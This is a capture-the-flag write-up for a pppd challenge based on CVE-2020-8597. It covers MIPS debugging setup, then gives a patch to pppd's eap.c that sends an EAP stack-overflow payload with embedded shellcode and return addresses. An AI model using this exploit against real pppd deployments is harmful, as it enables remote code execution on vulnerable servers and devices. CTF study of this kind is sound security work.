## pppd
[中文](./README_zh.md) [English](./README.md)

[attachment](./attachment.zip)

[docker](./docker.zip)

This challenge is required to write 1 day exp of CVE-2020-8597
This cve itself is actually very simple, just a stack overflow
But the difficulty is to communicate with pppd and debug under the mips environment

Most of the teams did not find a way to communicate with pppd during the game, so I directly released the hint and used socat to communicate with pppd

Next is how to debug

First of all, the network is diabled by default

In /etc/init.d/S40network, delete all comments, then modify the start.sh script, delete -net none, add -redir tcp: 9999 :: 9999 -redir tcp: 4242 :: 4242, so Network is configured

Then modify /etc/inittab
change
```
ttyS0 :: sysinit: / pppd auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100
```
into
```
ttyS0 :: sysinit: / bin / sh
```

Then go to github to download a [gdbserver] (https://github.com/hugsy/gdb-static/blob/master/gdbserver-7.12-mips-be), repack a cpio, start it

After entering the system, you get a shell by default, and the system comes with a socat

carried out
```
socat pty,link=/dev/serial,raw tcp-listen:9999 &
/pppd /dev/serial 9600 local lock defaultroute 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100
```
Then execute the following command to get the pid of pppd
```
ps | grep pppd
```
Use gdbserver attach to pppd
```
./gdbserver --attach 0.0.0.0:4242 pid
```
Then use gdb-multiarch to connect to gdbserver

Then downloading a pppd source code, compile
execute
```
socat pty,link=/tmp/serial,rawer tcp:127.0.0.1:9999
pppd noauth local lock defaultroute debug nodetach /tmp/serial 9600 user notadmin password notpassword
```
now you can start debug and write the exp

following this [guide](https://gist.github.com/nstarke/551433bcc72ff95588e168a0bb66612),you can write the exp of this chall

exp patch is below
```
--- ppp-ppp-2.4.7/pppd/eap.c	2014-08-09 12:31:39.000000000 +0000
+++ ppp-poc/ppp-ppp-2.4.7/pppd/eap.c	2020-04-12 03:23:54.321773453 +0000
@@ -1385,8 +1385,46 @@
 			esp->es_usedpseudo = 2;
 		}
 #endif /* USE_SRP */
-		eap_send_response(esp, id, typenum, esp->es_client.ea_name,
-		    esp->es_client.ea_namelen);
+		//eap_send_response(esp, id, typenum, esp->es_client.ea_name,
+		//    esp->es_client.ea_namelen);
+#define PAY_LEN 256
+		char sc[PAY_LEN];
+		memset(sc, 'C', PAY_LEN);
+		int* shellcode = (int*)sc;
+		shellcode[0]=0x3c09616c;
+		shellcode[1]=0x3529662f;
+		shellcode[2]=0xafa9fff8;
+		shellcode[3]=0x2419ff98;
+		shellcode[4]=0x3204827;
+		shellcode[5]=0xafa9fffc;
+		shellcode[6]=0x27bdfff8;
+		shellcode[7]=0x3a02020;
+		shellcode[8]=0x2805ffff;
+		shellcode[9]=0x2806ffff;
+		shellcode[10]=0x34020fa5;
+		shellcode[11]=0x101010c;
+		shellcode[12]=0xafa2fffc;
+		shellcode[13]=0x8fa4fffc;
+		shellcode[14]=0x3c19ffb5;
+		shellcode[15]=0x3739c7fd;
+		shellcode[16]=0x3202827;
+		shellcode[17]=0x3c190101;
+		shellcode[18]=0x373901fe;
+		shellcode[19]=0x3c060101;
+		shellcode[20]=0x34c60101;
+		shellcode[21]=0x3263026;
+		shellcode[22]=0x34020fa3;
+		shellcode[23]=0x101010c;
+		shellcode[24]=0x3c05004a;
+		shellcode[25]=0x34a53800;
+		shellcode[26]=0x20460002;
+		shellcode[27]=0x3c190042;
+		shellcode[28]=0x37396698;
+		shellcode[29]=0x320f809;
+		shellcode[30]=0x0;
+		sc[PAY_LEN-1] = '\0';
+
+		eap_send_response(esp, id, typenum, shellcode, PAY_LEN);
 		break;

 	case EAPT_NOTIFICATION:
@@ -1452,8 +1490,21 @@
 		BZERO(secret, sizeof (secret));
 		MD5_Update(&mdContext, inp, vallen);
 		MD5_Final(hash, &mdContext);
-		eap_chap_response(esp, id, hash, esp->es_client.ea_name,
-		    esp->es_client.ea_namelen);
+		//eap_chap_response(esp, id, hash, esp->es_client.ea_name,
+		//    esp->es_client.ea_namelen);
+		char payload[1024];
+                memset(payload, 'A', 1023);
+                memset(payload, 'B', 0x2a0);
+		int *tpayload = (int*)(payload + 0x2a0 - 4);
+		//*tpayload = 0x040A0BC;
+		*tpayload = 0x4083FC;
+		//*(tpayload-1) = 0x043EF9C;
+		*(tpayload-1) = 0x43EF9C;
+		*(tpayload-5) = 0x4a7a0c-8;
+
+                payload [1023] = '\0';
+                eap_chap_response(esp, id, hash, payload, 1024);
+		exit(0);
 		break;

 #ifdef USE_SRP
```
